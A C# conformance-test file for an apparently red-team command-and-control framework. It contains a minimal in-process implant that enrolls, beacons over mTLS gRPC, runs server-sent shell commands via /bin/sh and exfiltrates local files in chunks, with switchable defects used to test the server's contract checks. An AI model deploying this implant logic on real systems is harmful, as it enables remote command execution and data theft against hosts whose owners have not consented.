using System.Net.Http.Json;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;

namespace Rod.Conformance.Tests;

/// <summary>
/// The deliberate defects the harness's in-process implant can carry. Each
/// one breaks exactly one contract clause; the rest of the implementation
/// stays conforming, so a failing clause is attributable to its defect and
/// the harness names it.
/// </summary>
public sealed record ImplantDefects(
    bool SkipSignatureVerification = false,
    bool SpeakHandshakeSecond = false,
    bool ScrambleChunkSequences = false);

/// <summary>
/// A minimal Tier 0/Tier 1 implant written straight from the contract doc,
/// in-process so the harness can switch defects on and off: RSA-2048 enroll,
/// gRPC check-in over mTLS with pinned-CA server validation, canonical
/// tasking-signature verification, shell.exec execution, and chunked file.pull
/// exfil. The deliberately broken candidates the acceptance criterion names
/// are this implant with one defect flipped on.
/// </summary>
public sealed class MinimalImplant : IImplantCandidate
{
    public CandidateTransport Transport => CandidateTransport.GRpc;

    private readonly ImplantDefects _defects;
    private readonly HttpClient _enroll = new();
    private CancellationTokenSource? _running;
    private Task? _loop;

    // The replay-nonce state (architecture.md Sec 9), the reference posture:
    // advertise at every handshake, honor the echo, and keep the accepted
    // nonce floor across reconnects -- the server's counter is per-implant.
    private readonly TaskNonceFloor _nonces = new();
    private bool _negotiated;

    public MinimalImplant(ImplantDefects defects)
    {
        _defects = defects;
    }

    public bool HasExited => _loop is null || _loop.IsCompleted;

    public Task StartAsync(ConformanceTarget target)
    {
        if (_running is not null)
            throw new InvalidOperationException("The candidate is already running.");
        _running = new CancellationTokenSource();
        _loop = Task.Run(() => RunAsync(target, _running.Token));
        return Task.CompletedTask;
    }

    public async Task StopAsync()
    {
        _running?.Cancel();
        if (_loop is not null)
        {
            try
            {
                await _loop;
            }
            catch (OperationCanceledException)
            {
            }
            catch (RpcException)
            {
                // A killed connection surfaces here; the stop is the intent.
            }
        }
        _loop = null;
        _running = null;
    }

    public void Dispose() => _enroll.Dispose();

    private async Task RunAsync(ConformanceTarget target, CancellationToken cancellationToken)
    {
        // Tier 1: refuse to start past the baked kill date.
        if (target.KillDate is { } killDate && killDate < DateTimeOffset.UtcNow)
            return;

        // Tier 0, half one: generate the keypair, enroll the public half.
        using var key = RSA.Create(2048);
        using var response = await _enroll.PostAsJsonAsync(target.EnrollUrl, new
        {
            stagerTokenSecret = target.StagerToken,
            publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
        }, cancellationToken);
        response.EnsureSuccessStatusCode();
        using var document = await System.Text.Json.JsonDocument.ParseAsync(
            await response.Content.ReadAsStreamAsync(cancellationToken), cancellationToken: cancellationToken);
        var root = document.RootElement;
        var implantId = root.GetProperty("implantId").GetString()!;
        var engagementId = root.GetProperty("engagementId").GetString()!;
        var leaf = X509CertificateLoader.LoadCertificate(
            Convert.FromBase64String(root.GetProperty("leafCertificate").GetString()!));
        var cas = root.GetProperty("caChain").EnumerateArray()
            .Select(b64 => X509CertificateLoader.LoadCertificate(Convert.FromBase64String(b64.GetString()!)))
            .ToArray();

        // Tier 0, half two: beacon over mTLS until stopped.
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                await CheckInOnceAsync(target, implantId, engagementId, leaf, key, cas, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return;
            }
            catch (Exception)
            {
                // A dropped stream is a normal reconnect for a beacon loop.
            }
            await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken);
        }
    }

    private async Task CheckInOnceAsync(
        ConformanceTarget target,
        string implantId,
        string engagementId,
        X509Certificate2 leaf,
        RSA key,
        X509Certificate2[] cas,
        CancellationToken cancellationToken)
    {
        var leafWithKey = leaf.CopyWithPrivateKey(key);
        var handler = new SocketsHttpHandler
        {
            SslOptions = new SslClientAuthenticationOptions
            {
                ClientCertificates = new X509CertificateCollection { leafWithKey },
                RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                    PinServerChain(cert, chain, cas),
            },
        };
        using var channel = GrpcChannel.ForAddress($"https://{target.BeaconHostPort}",
            new GrpcChannelOptions { HttpHandler = handler, DisposeHttpClient = true });
        using var call = new Beacon.BeaconClient(channel).CheckIn(cancellationToken: cancellationToken);

        // The defect variant speaks its result frame first; the server answers
        // an unspecified handshake status and closes, which is the point.
        if (_defects.SpeakHandshakeSecond)
        {
            await call.RequestStream.WriteAsync(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult().ToByteArray()),
            });
        }

        await call.RequestStream.WriteAsync(new Frame
        {
            Payload = ByteString.CopyFrom(new HandshakeRequest
            {
                Version = new ProtocolVersion { Major = 1, Minor = 0 },
                ImplantId = implantId,
                Capabilities = { "shell.exec", "file.pull" },
                ReplayNonces = true,
            }.ToByteArray()),
        });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            return;
        var handshake = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (handshake.Status != HandshakeStatus.Ok)
            return; // Every non-OK status is permanent: stop checking in.
        _negotiated = handshake.ReplayNonces;

        while (await call.ResponseStream.MoveNext(cancellationToken))
        {
            var frame = call.ResponseStream.Current;
            if (frame.Kind == FrameKind.ChannelInput)
                continue; // No channel verb advertised: input never routes here.
            var request = TaskRequest.Parser.ParseFrom(frame.Payload);

            var outcome = Rod.V1.TaskOutcome.Failed;
            var output = "rejected";
            if (_defects.SkipSignatureVerification || VerifyTasking(cas, implantId, request))
            {
                (outcome, output) = request.Verb switch
                {
                    "shell.exec" => RunShell(request.Arguments),
                    "file.pull" => await FilePullAsync(call, request),
                    _ => (Rod.V1.TaskOutcome.Failed, "unknown verb"),
                };
            }
            else if (request.HasTaskNonce && _nonces.IsReplay(request.TaskNonce))
            {
                output = $"task rejected: replayed tasking (nonce {request.TaskNonce}); not executed";
            }

            await call.RequestStream.WriteAsync(new Frame
            {
                Kind = FrameKind.TaskResult,
                Payload = ByteString.CopyFrom(new TaskResult
                {
                    TaskId = request.TaskId,
                    Outcome = outcome,
                    Output = output,
                }.ToByteArray()),
            });
        }
    }

    private static (Rod.V1.TaskOutcome Outcome, string Output) RunShell(string arguments)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = "-c \"" + arguments.Replace("\"", "\\\"") + "\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        using var process = System.Diagnostics.Process.Start(psi)!;
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit(15000);
        return process.ExitCode == 0
            ? (Rod.V1.TaskOutcome.Succeeded, output)
            : (Rod.V1.TaskOutcome.Failed, output);
    }

    private async Task<(Rod.V1.TaskOutcome Outcome, string Output)> FilePullAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        TaskRequest request)
    {
        var path = request.Arguments.Split(' ')[0];
        if (!File.Exists(path))
            return (Rod.V1.TaskOutcome.Failed, "no such file");

        var content = await File.ReadAllBytesAsync(path);
        const int chunkSize = 512 * 1024;
        var order = Enumerable.Range(0, (content.Length + chunkSize - 1) / chunkSize).ToList();
        if (_defects.ScrambleChunkSequences && order.Count > 1)
            order.Reverse(); // The defect: terminal-first, reversed sequences.

        foreach (var index in order)
        {
            var offset = index * chunkSize;
            var end = Math.Min(offset + chunkSize, content.Length);
            var slice = new byte[end - offset];
            Array.Copy(content, offset, slice, 0, slice.Length);
            await call.RequestStream.WriteAsync(new Frame
            {
                Kind = FrameKind.ExfilChunk,
                Payload = ByteString.CopyFrom(new ExfilChunk
                {
                    TaskId = request.TaskId,
                    Name = Path.GetFileName(path),
                    ContentType = "application/octet-stream",
                    Sequence = (ulong)index,
                    Terminal = index == order.Count - 1,
                    Data = ByteString.CopyFrom(slice),
                }.ToByteArray()),
            });
        }
        return (Rod.V1.TaskOutcome.Succeeded, path);
    }

    /// <summary>
    /// Tier 1 tasking verification per the contract doc: RSASSA-PSS over
    /// SHA-256 on the canonical length-prefixed tuple -- the own implant_id,
    /// task_id, verb, arguments, and the nonce when the task carries one --
    /// followed by the replay-nonce floor: a nonce at or below the accepted
    /// floor is a replayed frame, and nonce-less tasking is refused once the
    /// arm was negotiated.
    /// </summary>
    private bool VerifyTasking(X509Certificate2[] cas, string implantId, TaskRequest request)
    {
        if (request.Signature.Length == 0)
            return false;

        using var canonical = new MemoryStream();
        var fields = request.HasTaskNonce
            ? new[] { implantId, request.TaskId, request.Verb, request.Arguments, request.TaskNonce.ToString() }
            : new[] { implantId, request.TaskId, request.Verb, request.Arguments };
        foreach (var value in fields)
        {
            var bytes = System.Text.Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        var signed = canonical.ToArray();

        foreach (var ca in cas)
        {
            using var rsa = ca.GetRSAPublicKey();
            if (rsa is null)
                continue;
            if (!rsa.VerifyData(signed, request.Signature.ToByteArray(),
                    HashAlgorithmName.SHA256, RSASignaturePadding.Pss))
                continue;

            if (request.HasTaskNonce)
            {
                if (_nonces.IsReplay(request.TaskNonce))
                    return false;
                _nonces.Observed(request.TaskNonce);
                return true;
            }
            return !_negotiated;
        }
        return false;
    }

    /// <summary>
    /// The accepted-nonce floor: monotonic across the candidate's whole run,
    /// so a replayed frame is refused regardless of which connection
    /// delivered it.
    /// </summary>
    private sealed class TaskNonceFloor
    {
        private ulong _highest;

        public bool IsReplay(ulong nonce) => nonce <= _highest;

        public void Observed(ulong nonce)
        {
            if (nonce > _highest)
                _highest = nonce;
        }
    }

    private static bool PinServerChain(
        X509Certificate? certificate,
        X509Chain? chain,
        X509Certificate2[] pinned)
    {
        if (certificate is not X509Certificate2 || chain is null)
            return false;
        chain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
        foreach (var ca in pinned)
            chain.ChainPolicy.ExtraStore.Add(ca);
        if (!chain.Build((X509Certificate2)certificate) || chain.ChainElements.Count == 0)
            return false;
        var root = chain.ChainElements[^1].Certificate;
        foreach (var ca in pinned)
            if (root.Thumbprint == ca.Thumbprint)
                return true;
        return false;
    }
}
